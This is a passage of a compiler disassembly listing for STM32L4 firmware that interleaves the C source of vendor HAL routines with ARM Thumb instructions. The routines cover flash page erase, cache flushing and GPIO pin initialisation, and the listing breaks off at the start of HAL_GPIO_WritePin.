0800183c <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 800183c:	b480      	push	{r7}
 800183e:	b083      	sub	sp, #12
 8001840:	af00      	add	r7, sp, #0
 8001842:	6078      	str	r0, [r7, #4]
 8001844:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 8001846:	4b0e      	ldr	r3, [pc, #56]	; (8001880 <FLASH_PageErase+0x44>)
 8001848:	695b      	ldr	r3, [r3, #20]
 800184a:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 800184e:	687b      	ldr	r3, [r7, #4]
 8001850:	00db      	lsls	r3, r3, #3
 8001852:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 8001856:	490a      	ldr	r1, [pc, #40]	; (8001880 <FLASH_PageErase+0x44>)
 8001858:	4313      	orrs	r3, r2
 800185a:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 800185c:	4b08      	ldr	r3, [pc, #32]	; (8001880 <FLASH_PageErase+0x44>)
 800185e:	695b      	ldr	r3, [r3, #20]
 8001860:	4a07      	ldr	r2, [pc, #28]	; (8001880 <FLASH_PageErase+0x44>)
 8001862:	f043 0302 	orr.w	r3, r3, #2
 8001866:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001868:	4b05      	ldr	r3, [pc, #20]	; (8001880 <FLASH_PageErase+0x44>)
 800186a:	695b      	ldr	r3, [r3, #20]
 800186c:	4a04      	ldr	r2, [pc, #16]	; (8001880 <FLASH_PageErase+0x44>)
 800186e:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001872:	6153      	str	r3, [r2, #20]
}
 8001874:	bf00      	nop
 8001876:	370c      	adds	r7, #12
 8001878:	46bd      	mov	sp, r7
 800187a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800187e:	4770      	bx	lr
 8001880:	40022000 	.word	0x40022000

08001884 <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 8001884:	b480      	push	{r7}
 8001886:	b083      	sub	sp, #12
 8001888:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 800188a:	4b21      	ldr	r3, [pc, #132]	; (8001910 <FLASH_FlushCaches+0x8c>)
 800188c:	7f1b      	ldrb	r3, [r3, #28]
 800188e:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 8001890:	79fb      	ldrb	r3, [r7, #7]
 8001892:	2b01      	cmp	r3, #1
 8001894:	d002      	beq.n	800189c <FLASH_FlushCaches+0x18>
 8001896:	79fb      	ldrb	r3, [r7, #7]
 8001898:	2b03      	cmp	r3, #3
 800189a:	d117      	bne.n	80018cc <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 800189c:	4b1d      	ldr	r3, [pc, #116]	; (8001914 <FLASH_FlushCaches+0x90>)
 800189e:	681b      	ldr	r3, [r3, #0]
 80018a0:	4a1c      	ldr	r2, [pc, #112]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018a2:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 80018a6:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 80018a8:	4b1a      	ldr	r3, [pc, #104]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018aa:	681b      	ldr	r3, [r3, #0]
 80018ac:	4a19      	ldr	r2, [pc, #100]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018ae:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 80018b2:	6013      	str	r3, [r2, #0]
 80018b4:	4b17      	ldr	r3, [pc, #92]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018b6:	681b      	ldr	r3, [r3, #0]
 80018b8:	4a16      	ldr	r2, [pc, #88]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018ba:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 80018be:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 80018c0:	4b14      	ldr	r3, [pc, #80]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018c2:	681b      	ldr	r3, [r3, #0]
 80018c4:	4a13      	ldr	r2, [pc, #76]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018c6:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80018ca:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 80018cc:	79fb      	ldrb	r3, [r7, #7]
 80018ce:	2b02      	cmp	r3, #2
 80018d0:	d002      	beq.n	80018d8 <FLASH_FlushCaches+0x54>
 80018d2:	79fb      	ldrb	r3, [r7, #7]
 80018d4:	2b03      	cmp	r3, #3
 80018d6:	d111      	bne.n	80018fc <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 80018d8:	4b0e      	ldr	r3, [pc, #56]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018da:	681b      	ldr	r3, [r3, #0]
 80018dc:	4a0d      	ldr	r2, [pc, #52]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018de:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 80018e2:	6013      	str	r3, [r2, #0]
 80018e4:	4b0b      	ldr	r3, [pc, #44]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018e6:	681b      	ldr	r3, [r3, #0]
 80018e8:	4a0a      	ldr	r2, [pc, #40]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018ea:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 80018ee:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 80018f0:	4b08      	ldr	r3, [pc, #32]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018f2:	681b      	ldr	r3, [r3, #0]
 80018f4:	4a07      	ldr	r2, [pc, #28]	; (8001914 <FLASH_FlushCaches+0x90>)
 80018f6:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80018fa:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80018fc:	4b04      	ldr	r3, [pc, #16]	; (8001910 <FLASH_FlushCaches+0x8c>)
 80018fe:	2200      	movs	r2, #0
 8001900:	771a      	strb	r2, [r3, #28]
}
 8001902:	bf00      	nop
 8001904:	370c      	adds	r7, #12
 8001906:	46bd      	mov	sp, r7
 8001908:	f85d 7b04 	ldr.w	r7, [sp], #4
 800190c:	4770      	bx	lr
 800190e:	bf00      	nop
 8001910:	2000000c 	.word	0x2000000c
 8001914:	40022000 	.word	0x40022000

08001918 <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 8001918:	b480      	push	{r7}
 800191a:	b087      	sub	sp, #28
 800191c:	af00      	add	r7, sp, #0
 800191e:	6078      	str	r0, [r7, #4]
 8001920:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001922:	2300      	movs	r3, #0
 8001924:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001926:	e148      	b.n	8001bba <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 8001928:	683b      	ldr	r3, [r7, #0]
 800192a:	681a      	ldr	r2, [r3, #0]
 800192c:	2101      	movs	r1, #1
 800192e:	697b      	ldr	r3, [r7, #20]
 8001930:	fa01 f303 	lsl.w	r3, r1, r3
 8001934:	4013      	ands	r3, r2
 8001936:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 8001938:	68fb      	ldr	r3, [r7, #12]
 800193a:	2b00      	cmp	r3, #0
 800193c:	f000 813a 	beq.w	8001bb4 <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 8001940:	683b      	ldr	r3, [r7, #0]
 8001942:	685b      	ldr	r3, [r3, #4]
 8001944:	f003 0303 	and.w	r3, r3, #3
 8001948:	2b01      	cmp	r3, #1
 800194a:	d005      	beq.n	8001958 <HAL_GPIO_Init+0x40>
 800194c:	683b      	ldr	r3, [r7, #0]
 800194e:	685b      	ldr	r3, [r3, #4]
 8001950:	f003 0303 	and.w	r3, r3, #3
 8001954:	2b02      	cmp	r3, #2
 8001956:	d130      	bne.n	80019ba <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 8001958:	687b      	ldr	r3, [r7, #4]
 800195a:	689b      	ldr	r3, [r3, #8]
 800195c:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 800195e:	697b      	ldr	r3, [r7, #20]
 8001960:	005b      	lsls	r3, r3, #1
 8001962:	2203      	movs	r2, #3
 8001964:	fa02 f303 	lsl.w	r3, r2, r3
 8001968:	43db      	mvns	r3, r3
 800196a:	693a      	ldr	r2, [r7, #16]
 800196c:	4013      	ands	r3, r2
 800196e:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 8001970:	683b      	ldr	r3, [r7, #0]
 8001972:	68da      	ldr	r2, [r3, #12]
 8001974:	697b      	ldr	r3, [r7, #20]
 8001976:	005b      	lsls	r3, r3, #1
 8001978:	fa02 f303 	lsl.w	r3, r2, r3
 800197c:	693a      	ldr	r2, [r7, #16]
 800197e:	4313      	orrs	r3, r2
 8001980:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 8001982:	687b      	ldr	r3, [r7, #4]
 8001984:	693a      	ldr	r2, [r7, #16]
 8001986:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 8001988:	687b      	ldr	r3, [r7, #4]
 800198a:	685b      	ldr	r3, [r3, #4]
 800198c:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 800198e:	2201      	movs	r2, #1
 8001990:	697b      	ldr	r3, [r7, #20]
 8001992:	fa02 f303 	lsl.w	r3, r2, r3
 8001996:	43db      	mvns	r3, r3
 8001998:	693a      	ldr	r2, [r7, #16]
 800199a:	4013      	ands	r3, r2
 800199c:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 800199e:	683b      	ldr	r3, [r7, #0]
 80019a0:	685b      	ldr	r3, [r3, #4]
 80019a2:	091b      	lsrs	r3, r3, #4
 80019a4:	f003 0201 	and.w	r2, r3, #1
 80019a8:	697b      	ldr	r3, [r7, #20]
 80019aa:	fa02 f303 	lsl.w	r3, r2, r3
 80019ae:	693a      	ldr	r2, [r7, #16]
 80019b0:	4313      	orrs	r3, r2
 80019b2:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 80019b4:	687b      	ldr	r3, [r7, #4]
 80019b6:	693a      	ldr	r2, [r7, #16]
 80019b8:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 80019ba:	683b      	ldr	r3, [r7, #0]
 80019bc:	685b      	ldr	r3, [r3, #4]
 80019be:	f003 0303 	and.w	r3, r3, #3
 80019c2:	2b03      	cmp	r3, #3
 80019c4:	d017      	beq.n	80019f6 <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 80019c6:	687b      	ldr	r3, [r7, #4]
 80019c8:	68db      	ldr	r3, [r3, #12]
 80019ca:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 80019cc:	697b      	ldr	r3, [r7, #20]
 80019ce:	005b      	lsls	r3, r3, #1
 80019d0:	2203      	movs	r2, #3
 80019d2:	fa02 f303 	lsl.w	r3, r2, r3
 80019d6:	43db      	mvns	r3, r3
 80019d8:	693a      	ldr	r2, [r7, #16]
 80019da:	4013      	ands	r3, r2
 80019dc:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 80019de:	683b      	ldr	r3, [r7, #0]
 80019e0:	689a      	ldr	r2, [r3, #8]
 80019e2:	697b      	ldr	r3, [r7, #20]
 80019e4:	005b      	lsls	r3, r3, #1
 80019e6:	fa02 f303 	lsl.w	r3, r2, r3
 80019ea:	693a      	ldr	r2, [r7, #16]
 80019ec:	4313      	orrs	r3, r2
 80019ee:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 80019f0:	687b      	ldr	r3, [r7, #4]
 80019f2:	693a      	ldr	r2, [r7, #16]
 80019f4:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 80019f6:	683b      	ldr	r3, [r7, #0]
 80019f8:	685b      	ldr	r3, [r3, #4]
 80019fa:	f003 0303 	and.w	r3, r3, #3
 80019fe:	2b02      	cmp	r3, #2
 8001a00:	d123      	bne.n	8001a4a <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 8001a02:	697b      	ldr	r3, [r7, #20]
 8001a04:	08da      	lsrs	r2, r3, #3
 8001a06:	687b      	ldr	r3, [r7, #4]
 8001a08:	3208      	adds	r2, #8
 8001a0a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8001a0e:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 8001a10:	697b      	ldr	r3, [r7, #20]
 8001a12:	f003 0307 	and.w	r3, r3, #7
 8001a16:	009b      	lsls	r3, r3, #2
 8001a18:	220f      	movs	r2, #15
 8001a1a:	fa02 f303 	lsl.w	r3, r2, r3
 8001a1e:	43db      	mvns	r3, r3
 8001a20:	693a      	ldr	r2, [r7, #16]
 8001a22:	4013      	ands	r3, r2
 8001a24:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 8001a26:	683b      	ldr	r3, [r7, #0]
 8001a28:	691a      	ldr	r2, [r3, #16]
 8001a2a:	697b      	ldr	r3, [r7, #20]
 8001a2c:	f003 0307 	and.w	r3, r3, #7
 8001a30:	009b      	lsls	r3, r3, #2
 8001a32:	fa02 f303 	lsl.w	r3, r2, r3
 8001a36:	693a      	ldr	r2, [r7, #16]
 8001a38:	4313      	orrs	r3, r2
 8001a3a:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001a3c:	697b      	ldr	r3, [r7, #20]
 8001a3e:	08da      	lsrs	r2, r3, #3
 8001a40:	687b      	ldr	r3, [r7, #4]
 8001a42:	3208      	adds	r2, #8
 8001a44:	6939      	ldr	r1, [r7, #16]
 8001a46:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001a4a:	687b      	ldr	r3, [r7, #4]
 8001a4c:	681b      	ldr	r3, [r3, #0]
 8001a4e:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001a50:	697b      	ldr	r3, [r7, #20]
 8001a52:	005b      	lsls	r3, r3, #1
 8001a54:	2203      	movs	r2, #3
 8001a56:	fa02 f303 	lsl.w	r3, r2, r3
 8001a5a:	43db      	mvns	r3, r3
 8001a5c:	693a      	ldr	r2, [r7, #16]
 8001a5e:	4013      	ands	r3, r2
 8001a60:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001a62:	683b      	ldr	r3, [r7, #0]
 8001a64:	685b      	ldr	r3, [r3, #4]
 8001a66:	f003 0203 	and.w	r2, r3, #3
 8001a6a:	697b      	ldr	r3, [r7, #20]
 8001a6c:	005b      	lsls	r3, r3, #1
 8001a6e:	fa02 f303 	lsl.w	r3, r2, r3
 8001a72:	693a      	ldr	r2, [r7, #16]
 8001a74:	4313      	orrs	r3, r2
 8001a76:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001a78:	687b      	ldr	r3, [r7, #4]
 8001a7a:	693a      	ldr	r2, [r7, #16]
 8001a7c:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001a7e:	683b      	ldr	r3, [r7, #0]
 8001a80:	685b      	ldr	r3, [r3, #4]
 8001a82:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001a86:	2b00      	cmp	r3, #0
 8001a88:	f000 8094 	beq.w	8001bb4 <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001a8c:	4b52      	ldr	r3, [pc, #328]	; (8001bd8 <HAL_GPIO_Init+0x2c0>)
 8001a8e:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001a90:	4a51      	ldr	r2, [pc, #324]	; (8001bd8 <HAL_GPIO_Init+0x2c0>)
 8001a92:	f043 0301 	orr.w	r3, r3, #1
 8001a96:	6613      	str	r3, [r2, #96]	; 0x60
 8001a98:	4b4f      	ldr	r3, [pc, #316]	; (8001bd8 <HAL_GPIO_Init+0x2c0>)
 8001a9a:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001a9c:	f003 0301 	and.w	r3, r3, #1
 8001aa0:	60bb      	str	r3, [r7, #8]
 8001aa2:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 8001aa4:	4a4d      	ldr	r2, [pc, #308]	; (8001bdc <HAL_GPIO_Init+0x2c4>)
 8001aa6:	697b      	ldr	r3, [r7, #20]
 8001aa8:	089b      	lsrs	r3, r3, #2
 8001aaa:	3302      	adds	r3, #2
 8001aac:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001ab0:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001ab2:	697b      	ldr	r3, [r7, #20]
 8001ab4:	f003 0303 	and.w	r3, r3, #3
 8001ab8:	009b      	lsls	r3, r3, #2
 8001aba:	220f      	movs	r2, #15
 8001abc:	fa02 f303 	lsl.w	r3, r2, r3
 8001ac0:	43db      	mvns	r3, r3
 8001ac2:	693a      	ldr	r2, [r7, #16]
 8001ac4:	4013      	ands	r3, r2
 8001ac6:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001ac8:	687b      	ldr	r3, [r7, #4]
 8001aca:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001ace:	d00d      	beq.n	8001aec <HAL_GPIO_Init+0x1d4>
 8001ad0:	687b      	ldr	r3, [r7, #4]
 8001ad2:	4a43      	ldr	r2, [pc, #268]	; (8001be0 <HAL_GPIO_Init+0x2c8>)
 8001ad4:	4293      	cmp	r3, r2
 8001ad6:	d007      	beq.n	8001ae8 <HAL_GPIO_Init+0x1d0>
 8001ad8:	687b      	ldr	r3, [r7, #4]
 8001ada:	4a42      	ldr	r2, [pc, #264]	; (8001be4 <HAL_GPIO_Init+0x2cc>)
 8001adc:	4293      	cmp	r3, r2
 8001ade:	d101      	bne.n	8001ae4 <HAL_GPIO_Init+0x1cc>
 8001ae0:	2302      	movs	r3, #2
 8001ae2:	e004      	b.n	8001aee <HAL_GPIO_Init+0x1d6>
 8001ae4:	2307      	movs	r3, #7
 8001ae6:	e002      	b.n	8001aee <HAL_GPIO_Init+0x1d6>
 8001ae8:	2301      	movs	r3, #1
 8001aea:	e000      	b.n	8001aee <HAL_GPIO_Init+0x1d6>
 8001aec:	2300      	movs	r3, #0
 8001aee:	697a      	ldr	r2, [r7, #20]
 8001af0:	f002 0203 	and.w	r2, r2, #3
 8001af4:	0092      	lsls	r2, r2, #2
 8001af6:	4093      	lsls	r3, r2
 8001af8:	693a      	ldr	r2, [r7, #16]
 8001afa:	4313      	orrs	r3, r2
 8001afc:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001afe:	4937      	ldr	r1, [pc, #220]	; (8001bdc <HAL_GPIO_Init+0x2c4>)
 8001b00:	697b      	ldr	r3, [r7, #20]
 8001b02:	089b      	lsrs	r3, r3, #2
 8001b04:	3302      	adds	r3, #2
 8001b06:	693a      	ldr	r2, [r7, #16]
 8001b08:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001b0c:	4b36      	ldr	r3, [pc, #216]	; (8001be8 <HAL_GPIO_Init+0x2d0>)
 8001b0e:	689b      	ldr	r3, [r3, #8]
 8001b10:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b12:	68fb      	ldr	r3, [r7, #12]
 8001b14:	43db      	mvns	r3, r3
 8001b16:	693a      	ldr	r2, [r7, #16]
 8001b18:	4013      	ands	r3, r2
 8001b1a:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001b1c:	683b      	ldr	r3, [r7, #0]
 8001b1e:	685b      	ldr	r3, [r3, #4]
 8001b20:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001b24:	2b00      	cmp	r3, #0
 8001b26:	d003      	beq.n	8001b30 <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001b28:	693a      	ldr	r2, [r7, #16]
 8001b2a:	68fb      	ldr	r3, [r7, #12]
 8001b2c:	4313      	orrs	r3, r2
 8001b2e:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001b30:	4a2d      	ldr	r2, [pc, #180]	; (8001be8 <HAL_GPIO_Init+0x2d0>)
 8001b32:	693b      	ldr	r3, [r7, #16]
 8001b34:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001b36:	4b2c      	ldr	r3, [pc, #176]	; (8001be8 <HAL_GPIO_Init+0x2d0>)
 8001b38:	68db      	ldr	r3, [r3, #12]
 8001b3a:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b3c:	68fb      	ldr	r3, [r7, #12]
 8001b3e:	43db      	mvns	r3, r3
 8001b40:	693a      	ldr	r2, [r7, #16]
 8001b42:	4013      	ands	r3, r2
 8001b44:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001b46:	683b      	ldr	r3, [r7, #0]
 8001b48:	685b      	ldr	r3, [r3, #4]
 8001b4a:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001b4e:	2b00      	cmp	r3, #0
 8001b50:	d003      	beq.n	8001b5a <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001b52:	693a      	ldr	r2, [r7, #16]
 8001b54:	68fb      	ldr	r3, [r7, #12]
 8001b56:	4313      	orrs	r3, r2
 8001b58:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001b5a:	4a23      	ldr	r2, [pc, #140]	; (8001be8 <HAL_GPIO_Init+0x2d0>)
 8001b5c:	693b      	ldr	r3, [r7, #16]
 8001b5e:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001b60:	4b21      	ldr	r3, [pc, #132]	; (8001be8 <HAL_GPIO_Init+0x2d0>)
 8001b62:	685b      	ldr	r3, [r3, #4]
 8001b64:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b66:	68fb      	ldr	r3, [r7, #12]
 8001b68:	43db      	mvns	r3, r3
 8001b6a:	693a      	ldr	r2, [r7, #16]
 8001b6c:	4013      	ands	r3, r2
 8001b6e:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001b70:	683b      	ldr	r3, [r7, #0]
 8001b72:	685b      	ldr	r3, [r3, #4]
 8001b74:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001b78:	2b00      	cmp	r3, #0
 8001b7a:	d003      	beq.n	8001b84 <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001b7c:	693a      	ldr	r2, [r7, #16]
 8001b7e:	68fb      	ldr	r3, [r7, #12]
 8001b80:	4313      	orrs	r3, r2
 8001b82:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001b84:	4a18      	ldr	r2, [pc, #96]	; (8001be8 <HAL_GPIO_Init+0x2d0>)
 8001b86:	693b      	ldr	r3, [r7, #16]
 8001b88:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001b8a:	4b17      	ldr	r3, [pc, #92]	; (8001be8 <HAL_GPIO_Init+0x2d0>)
 8001b8c:	681b      	ldr	r3, [r3, #0]
 8001b8e:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b90:	68fb      	ldr	r3, [r7, #12]
 8001b92:	43db      	mvns	r3, r3
 8001b94:	693a      	ldr	r2, [r7, #16]
 8001b96:	4013      	ands	r3, r2
 8001b98:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001b9a:	683b      	ldr	r3, [r7, #0]
 8001b9c:	685b      	ldr	r3, [r3, #4]
 8001b9e:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001ba2:	2b00      	cmp	r3, #0
 8001ba4:	d003      	beq.n	8001bae <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001ba6:	693a      	ldr	r2, [r7, #16]
 8001ba8:	68fb      	ldr	r3, [r7, #12]
 8001baa:	4313      	orrs	r3, r2
 8001bac:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001bae:	4a0e      	ldr	r2, [pc, #56]	; (8001be8 <HAL_GPIO_Init+0x2d0>)
 8001bb0:	693b      	ldr	r3, [r7, #16]
 8001bb2:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001bb4:	697b      	ldr	r3, [r7, #20]
 8001bb6:	3301      	adds	r3, #1
 8001bb8:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001bba:	683b      	ldr	r3, [r7, #0]
 8001bbc:	681a      	ldr	r2, [r3, #0]
 8001bbe:	697b      	ldr	r3, [r7, #20]
 8001bc0:	fa22 f303 	lsr.w	r3, r2, r3
 8001bc4:	2b00      	cmp	r3, #0
 8001bc6:	f47f aeaf 	bne.w	8001928 <HAL_GPIO_Init+0x10>
  }
}
 8001bca:	bf00      	nop
 8001bcc:	bf00      	nop
 8001bce:	371c      	adds	r7, #28
 8001bd0:	46bd      	mov	sp, r7
 8001bd2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001bd6:	4770      	bx	lr
 8001bd8:	40021000 	.word	0x40021000
 8001bdc:	40010000 	.word	0x40010000
 8001be0:	48000400 	.word	0x48000400
 8001be4:	48000800 	.word	0x48000800
 8001be8:	40010400 	.word	0x40010400

08001bec <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001bec:	b480      	push	{r7}
 8001bee:	b083      	sub	sp, #12
 8001bf0:	af00      	add	r7, sp, #0
 8001bf2:	6078      	str	r0, [r7, #4]
 8001bf4:	460b      	mov	r3, r1
 8001bf6:	807b      	strh	r3, [r7, #2]
 8001bf8:	4613      	mov	r3, r2
 8001bfa:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
